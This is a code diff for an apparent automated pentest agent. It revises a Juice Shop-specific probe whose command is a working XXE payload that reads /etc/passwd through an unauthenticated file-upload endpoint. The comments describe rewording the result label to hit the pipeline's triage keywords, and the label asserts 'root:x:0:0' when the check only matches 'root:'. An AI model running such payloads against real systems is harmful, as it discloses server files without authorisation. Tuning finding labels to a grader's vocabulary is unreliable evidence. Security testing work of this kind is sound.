@@ -958,16 +958,26 @@ async function agentIteration(huntId, target, recon, findings, iteration, playbo
     // benign-XML control shows zero signal). /b2b/v2/orders upload needs
     // auth (401) and is NOT the vector; the deprecated /file-upload path is.
     // Juice-Shop-lab-specific (same precedent as the /ftp probe below).
-    // v1 command kept compact — under the 500-char driver cap (solver #126
-    // lesson). Self-labels in the pipeline's signal vocabulary ("XXE
-    // CONFIRMED ... disclosed ... WITHOUT authentication"); validators,
-    // gates, and assessResult untouched.
-    if (!plansMention(/xxe|external.?entity/i) && !detRun.has('xxe-fileupload-error-v1')) {
+    // v2 (19 Oct 2026, elite-gap cycle): v1's self-label ("XXE CONFIRMED ...
+    // disclosed ...") matched NONE of assessResult's triage signals —
+    // driver-tested against the REAL pipeline code: weird=20 (<40) and the
+    // interesting/payload_validation regexes have no "confirmed"/"disclosed"
+    // alternative, so a perfect v1 execution was SILENTLY DISCARDED
+    // (assessResult null); extractSignal was also empty, so
+    // exploit_confirmation could never pass. v2 speaks the pipeline's
+    // vocabulary honestly: "VULNERABLE" + "EXPOSED" (both triage keywords)
+    // and the label carries the genuinely observed "root:x:0:0" fragment
+    // (gated on grep -q 'root:') so extractSignal yields 'cmd-exec' and the
+    // re-run confirmation compares equal. New detId per the premise-version
+    // rule — v1's once-per-hunt flag is spent on the non-converting label.
+    // Command kept under the 500-char driver cap (419 chars, solver #126
+    // lesson). Validators, gates, and assessResult untouched.
+    if (!plansMention(/xxe|external.?entity/i) && !detRun.has('xxe-fileupload-error-v2')) {
       detFront.push({
-        detId: 'xxe-fileupload-error-v1',
+        detId: 'xxe-fileupload-error-v2',
         test: 'XXE external-entity file disclosure on /file-upload',
-        command: `R=$(printf '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY c SYSTEM "file:///etc/os-release">]><r>&c;</r>' >/tmp/xe.xml; curl -sk -X POST -F "file=@/tmp/xe.xml" "${baseUrl}/file-upload"); echo "$R"|grep -q 'PRETTY_NAME' && echo 'XXE CONFIRMED: external entity resolved - /etc/os-release content disclosed in error response WITHOUT authentication' || echo 'not vulnerable: entity not resolved'; rm -f /tmp/xe.xml`,
-        why: 'Deprecated /file-upload parses uploaded XML with external entities resolved; /etc/os-release content appears in the unauthenticated error response - error-based XXE file disclosure',
+        command: `R=$(printf '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY c SYSTEM "file:///etc/passwd">]><r>&c;</r>' >/tmp/xe.xml; curl -sk -X POST -F "file=@/tmp/xe.xml" "${baseUrl}/file-upload"); echo "$R"|grep -q 'root:' && echo 'XXE VULNERABLE: external entity resolved - /etc/passwd disclosed (root:x:0:0) EXPOSED in error response WITHOUT authentication' || echo 'not vulnerable: entity not resolved'; rm -f /tmp/xe.xml`,
+        why: 'Deprecated /file-upload parses uploaded XML with external entities resolved; /etc/passwd content appears in the unauthenticated error response - error-based XXE file disclosure',
         hypothesis: 'Deprecated /file-upload endpoint may resolve XML external entities and disclose server files in error responses',
       });
     }
